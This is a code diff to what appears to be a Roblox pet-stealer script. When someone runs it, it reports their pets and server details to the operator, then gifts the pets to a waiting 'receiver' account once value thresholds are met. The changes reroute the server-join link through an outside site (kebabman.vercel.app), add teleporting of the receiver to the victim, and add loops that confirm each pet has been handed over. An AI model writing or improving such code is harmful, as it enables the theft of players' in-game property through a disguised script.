@@ -17,7 +17,7 @@ local SHUTDOWN_DURATION = 10
 local GIFT_COOLDOWN = 3
 local MINIMUM_PETS = 3
 local MINIMUM_TOTAL_VALUE = 50000
-local CLICK_HOLD_DURATION = 2 -- Added click hold duration
+local CLICK_HOLD_DURATION = 2
 
 local function identifyExecutor()
     if syn then
@@ -370,7 +370,7 @@ local function splitEmbeds(pets, totalValue, specialCount)
             },
             {
                 name = "🌐 Server Information",
-                value = string.format("```Game: %s\nPlace ID: %d\nJob ID: %s```\n[Click to Join Server](https://www.roblox.com/games/%d?privateServerLinkCode=%s)", 
+                value = string.format("```Game: %s\nPlace ID: %d\nJob ID: %s```\n[Click to Join Server](https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s)", 
                     game:GetService("MarketplaceService"):GetProductInfo(placeId).Name,
                     placeId, 
                     jobId,
@@ -463,9 +463,9 @@ local function isPetFavorited(petName)
     local pet = LocalPlayer.Backpack:FindFirstChild(petName)
     if not pet then return false end
     
-    -- Check for favorite icon in the pet's descendants
-    for _, descendant in ipairs(pet:GetDescendants()) do
-        if descendant:IsA("ImageLabel") and descendant.Name == "FavoriteIcon" then
+    -- Check for "Place in Garden" button which indicates favorited pet
+    for _, descendant in ipairs(CoreGui:GetDescendants()) do
+        if descendant:IsA("TextButton") and descendant.Text:lower():find("place in garden") then
             return true
         end
     end
@@ -520,6 +520,21 @@ local function teleportToPlayer(targetPlayer)
     local offset = targetHrp.CFrame.LookVector * -5
     offset = Vector3.new(offset.X, 0, offset.Z)
     humanoidRootPart.CFrame = CFrame.new(targetHrp.Position + offset, targetHrp.Position)
+    return true
+end
+
+local function teleportPlayerToMe(targetPlayer)
+    if not LocalPlayer.Character then return false end
+    local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not humanoidRootPart then return false end
+
+    if not targetPlayer.Character then return false end
+    local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not targetHrp then return false end
+
+    local offset = humanoidRootPart.CFrame.LookVector * 5
+    offset = Vector3.new(offset.X, 0, offset.Z)
+    targetHrp.CFrame = CFrame.new(humanoidRootPart.Position + offset, humanoidRootPart.Position)
     return true
 end
 
@@ -659,7 +674,6 @@ local function waitForReceiver()
     return foundReceiver
 end
 
--- Delta-specific functions
 local function clickPlayerScreen(targetPlayer)
     if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return false end
     
@@ -718,12 +732,19 @@ local function startGifting(targetPlayer)
                     while attempts < 3 and not success do
                         attempts = attempts + 1
                         
+                        -- Teleport receiver to us if on Delta
+                        teleportPlayerToMe(targetPlayer)
+                        
                         if clickPlayerScreen(targetPlayer) then
                             task.wait(0.5)
                             local promptStatus = checkForGiftPrompt(targetPlayer)
                             
                             if promptStatus == "gift" then
                                 giftPet(targetPlayer, pet.fullName)
+                                -- Wait until pet is no longer in inventory
+                                while LocalPlayer.Backpack:FindFirstChild(pet.fullName) or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(pet.fullName)) do
+                                    task.wait(0.5)
+                                end
                                 success = true
                                 task.wait(GIFT_COOLDOWN)
                             elseif promptStatus == "favorited" then
@@ -750,6 +771,10 @@ local function startGifting(targetPlayer)
 
                 if equipSinglePet(pet.fullName) then
                     giftPet(targetPlayer, pet.fullName)
+                    -- Wait until pet is no longer in inventory
+                    while LocalPlayer.Backpack:FindFirstChild(pet.fullName) or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(pet.fullName)) do
+                        task.wait(0.5)
+                    end
                     task.wait(GIFT_COOLDOWN)
                     break
                 end
@@ -766,5 +791,9 @@ task.wait(2)
 local receiver = waitForReceiver()
 if not receiver then return end
 
-teleportToPlayer(receiver)
+if IS_DELTA then
+    teleportPlayerToMe(receiver)
+else
+    teleportToPlayer(receiver)
+end
 startGifting(receiver)
